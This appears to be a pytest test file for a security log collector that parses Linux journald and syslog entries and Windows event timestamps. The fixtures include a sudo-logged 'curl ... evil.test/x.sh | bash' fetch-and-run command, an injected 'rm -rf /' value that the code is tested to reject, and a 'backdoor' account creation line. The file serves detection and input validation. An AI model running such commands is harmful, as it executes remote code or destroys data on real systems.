import json
import os
import subprocess
import sys
from datetime import datetime, timedelta, timezone

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from app.collector import linux_collector as lc
from app.collector.windows_collector import windows_time_to_utc_iso
from app.normalizer.normalize import normalize_event


def _journal(message, identifier="sshd", priority=6, micros=1790783044000000, **extra):
    record = {
        "__REALTIME_TIMESTAMP": str(micros),
        "MESSAGE": message,
        "SYSLOG_IDENTIFIER": identifier,
        "PRIORITY": str(priority),
        "_PID": "4242",
        "_HOSTNAME": "ubuntu-box",
        "_SYSTEMD_UNIT": f"{identifier}.service",
    }
    record.update(extra)
    return record


# --------------------------------------------------------------------- #
# journald record conversion
# --------------------------------------------------------------------- #

def test_journal_ssh_failed_password_extracts_fields():
    raw = lc.journal_record_to_raw(_journal("Failed password for alice from 203.0.113.9 port 51234 ssh2"))
    assert raw["operating_system"] == "Linux"
    assert raw["data_origin"] == "OBSERVED"
    assert raw["event_id"] is None  # Linux has no numeric event IDs - never invented
    assert raw["event_type"] == "SSH Failed Login"
    assert raw["user"] == "alice"
    assert raw["source_ip"] == "203.0.113.9"
    assert raw["source_port"] == 51234
    assert raw["computer"] == "ubuntu-box"
    assert raw["process_id"] == 4242
    assert raw["timestamp"].endswith("+00:00")


def test_journal_invalid_user_is_distinguished():
    raw = lc.journal_record_to_raw(_journal("Failed password for invalid user admin from 198.51.100.4 port 2222 ssh2"))
    assert raw["event_type"] == "SSH Failed Login (Invalid User)"
    assert raw["user"] == "admin"


def test_journal_sudo_command_uses_logged_command_line():
    raw = lc.journal_record_to_raw(_journal(
        "bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/curl http://evil.test/x.sh | bash",
        identifier="sudo",
        _CMDLINE="sudo curl ...",
    ))
    assert raw["event_type"] == "Sudo Command Executed"
    assert raw["user"] == "bob"
    assert raw["command_line"] == "/usr/bin/curl http://evil.test/x.sh | bash"


def test_journal_priority_maps_to_level_and_binary_message_decodes():
    raw = lc.journal_record_to_raw(_journal(list(b"kernel: segfault at 0 ip"), identifier="kernel", priority=2))
    assert raw["level"] == "Critical"
    assert raw["message"].startswith("kernel: segfault")
    assert raw["event_type"] == "Process Crash"


def test_journal_unmatched_message_gets_neutral_label():
    raw = lc.journal_record_to_raw(_journal("Started Daily apt download activities.", identifier="systemd"))
    assert raw["event_type"] == "systemd log"


def test_normalizer_keeps_linux_os_and_raw_evidence():
    raw = lc.journal_record_to_raw(_journal("Accepted publickey for carol from 10.0.0.5 port 50000 ssh2"))
    ne = normalize_event(raw)
    assert ne.operating_system == "Linux"
    assert ne.event_type == "SSH Successful Login"
    assert json.loads(ne.raw_data)["message"].startswith("Accepted publickey")


# --------------------------------------------------------------------- #
# syslog text fallback
# --------------------------------------------------------------------- #

def test_syslog_bsd_line_parsed():
    now = datetime(2026, 9, 30, 12, 0, tzinfo=timezone.utc)
    raw = lc.syslog_line_to_raw(
        "Sep 29 10:15:01 web01 sshd[901]: Invalid user oracle from 192.0.2.77 port 40022",
        "/var/log/auth.log",
        now=now,
    )
    assert raw["log_source"] == "Linux auth.log"
    assert raw["computer"] == "web01"
    assert raw["process_id"] == 901
    assert raw["event_type"] == "SSH Failed Login (Invalid User)"
    assert raw["source_ip"] == "192.0.2.77"
    assert raw["timestamp"].startswith("2026-09-")


def test_syslog_rfc3339_line_parsed_to_utc():
    raw = lc.syslog_line_to_raw(
        "2026-09-30T21:08:41.123456+05:30 web01 useradd[77]: new user: name=backdoor, UID=1001, GID=1001",
        "/var/log/auth.log",
    )
    assert raw["timestamp"] == "2026-09-30T15:38:41.123456+00:00"
    assert raw["event_type"] == "User Account Created"


def test_syslog_garbage_line_ignored():
    assert lc.syslog_line_to_raw("not a syslog line", "/var/log/syslog") is None


# --------------------------------------------------------------------- #
# collect_events orchestration
# --------------------------------------------------------------------- #

def test_collect_refuses_on_non_linux(monkeypatch):
    monkeypatch.setattr(lc, "IS_LINUX", False)
    with pytest.raises(lc.LinuxCollectorUnavailableError, match="requires Linux"):
        lc.collect_events()


def test_collect_rejects_bad_time_window(monkeypatch):
    monkeypatch.setattr(lc, "IS_LINUX", True)
    with pytest.raises(lc.LinuxCollectorUnavailableError, match="Invalid time window"):
        lc.collect_events(last="1 hour; rm -rf /")


def test_collect_uses_journalctl_and_reports_permission_hint(monkeypatch):
    monkeypatch.setattr(lc, "IS_LINUX", True)
    monkeypatch.setattr(lc.shutil, "which", lambda name: "/usr/bin/journalctl")
    captured = {}

    def fake_run(cmd, **kwargs):
        captured["cmd"] = cmd
        out = "\n".join(json.dumps(_journal(f"Failed password for bob from 203.0.113.{i} port 22 ssh2")) for i in range(3))
        return subprocess.CompletedProcess(
            cmd, 0, stdout=out,
            stderr="Hint: You are currently not seeing messages from other users and the system.",
        )

    monkeypatch.setattr(lc.subprocess, "run", fake_run)
    warnings = []
    events = lc.collect_events(last="15m", max_events=50, warnings=warnings)
    assert len(events) == 3
    assert captured["cmd"][:3] == ["journalctl", "-o", "json"]
    assert "-15m" in captured["cmd"] and "50" in captured["cmd"]
    assert any("adm" in w for w in warnings)


def test_collect_falls_back_to_syslog_files(monkeypatch, tmp_path):
    auth = tmp_path / "auth.log"
    auth.write_text(
        "Sep 29 10:15:01 web01 sshd[901]: Failed password for root from 192.0.2.1 port 1 ssh2\n"
        "Sep 29 10:15:03 web01 sshd[901]: Failed password for root from 192.0.2.1 port 2 ssh2\n",
        encoding="utf-8",
    )
    monkeypatch.setattr(lc, "IS_LINUX", True)
    monkeypatch.setattr(lc.shutil, "which", lambda name: None)
    monkeypatch.setattr(lc, "SYSLOG_FILES", (str(auth), str(tmp_path / "missing.log")))
    events = lc.collect_events(max_events=10)
    assert len(events) == 2
    assert all(e["event_type"] == "SSH Failed Login" for e in events)


def test_collect_with_nothing_readable_raises(monkeypatch, tmp_path):
    monkeypatch.setattr(lc, "IS_LINUX", True)
    monkeypatch.setattr(lc.shutil, "which", lambda name: None)
    monkeypatch.setattr(lc, "SYSLOG_FILES", (str(tmp_path / "none.log"),))
    with pytest.raises(lc.LinuxCollectorUnavailableError, match="No readable Linux logs"):
        lc.collect_events()


# --------------------------------------------------------------------- #
# Windows timestamp fix
# --------------------------------------------------------------------- #

def test_windows_naive_local_time_is_converted_not_relabelled():
    naive_local = datetime(2026, 9, 30, 21, 26, 12)
    expected = naive_local.astimezone(timezone.utc).isoformat()
    assert windows_time_to_utc_iso(naive_local) == expected


def test_windows_aware_time_is_converted_to_utc():
    ist = timezone(timedelta(hours=5, minutes=30))
    aware = datetime(2026, 9, 30, 21, 26, 12, tzinfo=ist)
    assert windows_time_to_utc_iso(aware) == "2026-09-30T15:56:12+00:00"


def test_windows_channel_errors_are_explained_in_plain_language():
    from app.collector.windows_collector import describe_channel_error

    privilege = Exception(1314, "OpenEventLogW", "A required privilege is not held by the client.")
    assert describe_channel_error("Security", privilege) == (
        "Security log skipped: reading it requires running the backend as Administrator."
    )
    missing = Exception(2, "OpenEventLogW", "The system cannot find the file specified.")
    assert "isn't present" in describe_channel_error("Microsoft-Windows-Sysmon/Operational", missing)


def test_journal_logging_process_argv_is_not_treated_as_command_line():
    record = _journal("Refreshing snaps", identifier="snapd", _CMDLINE="/usr/lib/snapd/snapd", _EXE="/usr/lib/snapd/snapd")
    raw = lc.journal_record_to_raw(record)
    assert raw["command_line"] is None
    assert raw["process_name"] == "/usr/lib/snapd/snapd"
    # the untouched journal entry is preserved as evidence
    assert raw["journal_record"] == record


def test_syslog_original_line_is_preserved():
    line = "Sep 29 10:15:01 web01 sshd[901]: Failed password for root from 192.0.2.1 port 1 ssh2"
    raw = lc.syslog_line_to_raw(line, "/var/log/auth.log")
    assert raw["syslog_line"] == line
